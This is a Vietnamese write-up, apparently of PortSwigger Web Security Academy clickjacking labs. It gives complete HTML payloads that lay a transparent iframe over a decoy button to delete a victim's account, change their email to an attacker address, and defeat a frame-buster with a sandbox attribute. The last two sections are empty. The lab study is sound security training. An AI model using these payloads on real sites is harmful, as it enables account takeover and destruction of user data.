# 1. Basic clickjacking with CSRF token protection
Ta vào exploit server và config đoạn HTML sau:
```
<style>
#target_website{
  position: relative;
  width: 600px;
  height: 600px;
  opacity: 0.00001;
  z-index: 2;
}
#decoy_website{
  position: absolute;
  width: 300px;
  height: 400px;
  z-index: 1;
}
#click{
  width: 144px;
  height: 34px;
  position: relative;
  top: 480px;
  left: 19px;
  border-radius: 30px;
}
</style>
<body>
  <div id="decoy_website">
    <button id="click">Click me</button>
  </div>
  <iframe id="target_website" src="https://0a2c004d03768f27c0ac86a700870048.web-security-academy.net/my-account"></iframe>
</body>
```

Đoạn XML trên sẽ tạo một `<iframe>` trỏ tới website có lỗ hổng clickjacking, làm mờ thẻ `<iframe>`, sau đó đặt 1 button đè lên button "Delete account". Khi user click vào button, request xóa user sẽ được gửi đi.

Sau khi click "Deliver to victim", kết quả thành công.

# 2. Clickjacking with form input data prefilled from a URL parameter
Để giải bài lab, ta cần đổi email của user. Nhận thấy nếu đặt query string trong email, ví dụ `/my-account?email=attacker@gmail.com` thì trong ô input của email sẽ tự động được gán giá trị "attacker@gmail.com"

Vào exploit server và cấu hình đoạn HTML sau:
```
<style>
#target_website{
  position: relative;
  width: 600px;
  height: 600px;
  opacity: 0.9;
  z-index: 2;
}
#decoy_website{
  position: absolute;
  width: 300px;
  height: 400px;
  z-index: 1;
}
#click{
  width: 136px;
  height: 34px;
  position: relative;
  top: 433;
  left: 32px;
  border-radius: 30px;
}
</style>
<body>
  <div id="decoy_website">
    <button id="click">Click me</button>
  </div>
  <iframe id="target_website" src="https://0a00002103d37562c01a91bf00d600cb.web-security-academy.net/my-account?email=attacker@gmail.com"></iframe>
</body>
```

Sau khi click "Deliver to victim", kết quả thành công.

# 3. Clickjacking with a frame buster script
Website có sử dụng Javascript để chặn việc website bị framed:

![image](https://user-images.githubusercontent.com/103978452/210330878-b459d61f-06fb-4b79-827b-19301fd75ede.png)

Tuy nhiên với thuộc tính `sandbox="allow-forms"`, ta có thể disable Javascript. Cấu hình đoạn HTML sau trong exploit server:

```
<style>
#target_website{
  position: relative;
  width: 600px;
  height: 600px;
  opacity: 0.9;
  z-index: 2;
}
#decoy_website{
  position: absolute;
  width: 300px;
  height: 400px;
  z-index: 1;
}
#click{
  width: 136px;
  height: 34px;
  position: relative;
  top: 433;
  left: 32px;
  border-radius: 30px;
}
</style>
<body>
  <div id="decoy_website">
    <button id="click">Click me</button>
  </div>
  <iframe id="target_website" src="https://0ab100360375e346c04af916004800ba.web-security-academy.net/my-account?email=attacker@gmail.com" sandbox="allow-forms"></iframe>
</body>
```

Sau khi click "Deliver to victim", kết quả thành công.
# 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS

# 5. Multistep clickjacking
